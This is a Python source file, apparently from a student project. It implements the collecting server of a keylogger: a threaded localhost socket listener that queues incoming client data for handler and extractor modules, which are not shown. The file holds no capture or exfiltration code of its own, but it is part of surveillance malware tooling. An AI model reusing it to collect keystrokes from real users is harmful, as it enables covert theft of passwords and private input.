'''
File: Consumer.py
Author: Christopher Wood, caw4567@rit.edu
Usage: 
	python consumer.py
'''

# For socket I/O programming
import socket
import threading
import Queue # thread-safe queue for producer/consumer implementations

# The client handler thread
import Handler
import ClientObject
import Extractor

class Server(threading.Thread):
	'''
	This the server class that is responsible for spawning client handler threads
	for all incoming connections. It is set to only accept incoming connections from the
	localhost, but network capabilities would also be possible.
	'''

	# Socket configuration parameters
	HOST = 'localhost'
	PORT = 9998
	BUFFSIZE = 1024
	running  = False

	# The socket object
	serverSock = None

	# Client thread handlers (in case the keylogger needs to restart)
	clientList = []
	handler = None

	# The data bucket
	queue = Queue.Queue()

	def __init__(self):
		threading.Thread.__init__(self)
		self.running = False
		print("Consumer created.")

	def run(self):
		address = (self.HOST, self.PORT)
		self.running = True
		self.serverSock = socket.socket()
		self.serverSock.bind(address)
		self.serverSock.listen(2)

		# Create the handler thread
		self.handler = Handler.Handler(self, self.queue)
		self.handler.start()

		# Wait for incoming connections
		while self.running:
			clientInfo = self.serverSock.accept()
			print("Client connected from {}.".format(clientInfo[1]))
			self.handler.clientList.append(ClientObject.ClientObject(clientInfo))

		serverSock.close()
		print("- end -")

def main():
	print("Starting keylogger consumer. Building the thread components.")
	server = Server()
	server.start()
	extractor = Extractor.Extractor(server, server.queue)
	extractor.start()

# Let it rip.
main()
